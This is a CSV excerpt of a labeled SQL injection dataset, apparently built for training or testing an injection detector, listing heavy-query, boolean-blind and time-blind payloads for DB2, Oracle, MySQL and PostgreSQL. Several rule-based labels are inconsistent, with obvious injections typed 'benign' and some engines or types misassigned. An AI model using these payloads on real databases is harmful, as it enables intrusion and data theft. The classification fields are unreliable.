row_index,payload_norm,label,sqli_type_hint,sqli_type,db_engine,confidence,reasoning,label_source
5353,"1%"" ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ""%"" = """,1,,heavy_query,generic,0.95,"generate_series (, select count ( * ) from generate_series ( 1,5000000 detected — heavy_query injection (priority 6) on generic",rule-based
5354,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and ( ( ( ""%"" = """,1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
5355,"1"" ) ) as tncm where 8203 = 8203 and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1,,heavy_query,db2,0.95,"select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm detected — heavy_query injection (priority 6) on db2",rule-based
5356,"1' ) ) ) and make_set ( 6094 = 2929,2929 ) and ( ( ( 'gkyo' = 'gkyo",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
5357,1'|| ( select 'feyg' from dual where 7734 = 7734 and 3843 = 6724#,1,,boolean_blind,oracle,0.95,7734 = 7734 and detected — boolean_blind injection (priority 8) on oracle,rule-based
5358,"1"" ) ) ) and 7533 = 7533 and ( ( ( ""xopd"" = ""xopd",1,,boolean_blind,generic,0.95,7533 = 7533 and detected — boolean_blind injection (priority 8) on generic,rule-based
5359,"1%"" ) and elt ( 7436 = 9874,9874 ) and ( ""%"" = """,1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
5360,-2866' ) ) or 4491 = 9429#,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5361,"1' ) or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )",1,,heavy_query,generic,0.95,"select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers detected — heavy_query injection (priority 6) on generic",rule-based
5362,end and ( ( 'pfrt' = 'pfrt,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5363,1 ) as ozga where 4002 = 4002 and 6969 = ( select 6969 from pg_sleep ( 5 ) ) --,1,,time_blind,mysql,0.95,"sleep (, pg_sleep ( is PostgreSQL-specific time-delay function — time-based blind inference (priority 5)",rule-based
5364,"iif ( 7011 = 2522,1,1/0 )",1,,unknown,unknown,0.5,Insufficient information to classify,rule-based
5365,-4904' ) as ogyu where 2821 = 2821 or 5982 = 1643,1,,boolean_blind,generic,0.95,2821 = 2821 or detected — boolean_blind injection (priority 8) on generic,rule-based
5366,-3339' or 8571 = 8571--,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
5367,"1%' ) ) and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) and ( ( '%' = '",1,,boolean_blind,generic,0.95,) and ( detected — boolean_blind injection (priority 8) on generic,rule-based
5368,"1"" or elt ( 6272 = 6272,sleep ( 5 ) ) and ""hvic"" like ""hvic",1,,time_blind,mysql,0.95,sleep ( is MySQL-specific time-delay function — time-based blind inference (priority 5),rule-based
5369,1' and ( 3020 = 3020 ) *6703 and 'hnvf' = 'hnvf,1,,benign,generic,0.8,No attack signals detected in payload,rule-based
